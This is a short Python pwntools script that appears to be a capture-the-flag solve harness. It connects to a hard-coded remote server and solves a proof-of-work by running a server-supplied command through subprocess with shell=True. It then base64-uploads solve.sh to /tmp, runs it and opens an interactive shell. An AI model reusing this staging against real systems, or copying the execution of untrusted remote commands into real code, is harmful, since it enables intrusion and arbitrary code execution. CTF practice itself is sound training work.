import os
import gzip
import base64
import time
from pathlib import Path
import subprocess

os.environ["PWNLIB_NOTERM"] = "true"
import pwn

cmds = []


def send_file(io, filepath):
    s = open(filepath, "rb").read()
    s = gzip.compress(s)
    s = base64.b64encode(s).decode()
    cmds.append(f"echo -n {s} | base64 -d > {filepath.name}.gz")
    cmds.append(f"gzip -d {filepath.name}.gz")


def solve_pow(io):
    print("[*] Solving PoW ...")
    io.recvuntil("Send the output of: ")
    cmd = io.recvlineS().strip()
    token = subprocess.check_output(cmd, shell=True).strip()
    print("[+] Solved PoW")
    io.sendline(token)


# io = pwn.remote("localhost", 1024)
io = pwn.remote("35.188.197.160", int(pwn.args["PORT"]))

pwn.context.log_level = "debug"

solve_pow(io)

cmds.append("cd /tmp")

# send_file(io, Path("solve.py"))
# cmds.append("cd /room0")
# cmds.append("python3 -u /tmp/solve.py")

send_file(io, Path("solve.sh"))
cmds.append("cd /room0")
cmds.append("bash /tmp/solve.sh")

cmd = " && ".join(cmds)
io.sendline(cmd)

pwn.context.log_level = "info"
io.interactive()
